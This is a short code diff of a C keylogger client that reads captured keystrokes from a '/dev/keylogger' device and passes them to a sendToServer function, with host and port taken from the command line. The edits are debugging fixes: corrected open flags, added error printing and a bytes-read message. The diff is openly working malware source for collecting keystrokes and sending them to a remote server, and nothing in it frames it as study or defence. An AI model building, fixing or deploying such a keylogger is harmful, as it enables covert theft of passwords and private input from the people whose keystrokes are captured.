@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <sys/select.h>
 
 #define BUFFER_LEN 1024
 
@@ -34,9 +35,10 @@ int main(int argc, char *argv[])
     int port = atoi(argv[2]);
 
     int dev;
-    if ((dev = open("/dev/keylogger", O_RDONLY | ~O_NONBLOCK)) == -1)
+    if ((dev = open("/dev/keylogger", O_RDONLY)) == -1)
     {
-        fprintf(stderr, "Cannot open device\n");
+		perror("open");
+		fprintf(stderr, "Cannot open device\n");
         exit(2);
     }
 
@@ -49,6 +51,7 @@ int main(int argc, char *argv[])
             close(dev);
             exit(3);
         }
+        printf("Read %d bytes\n", readBytes);
 
         currentSize += readBytes;
         if (currentSize == BUFFER_LEN && !sendToServer(host, port) || 1)
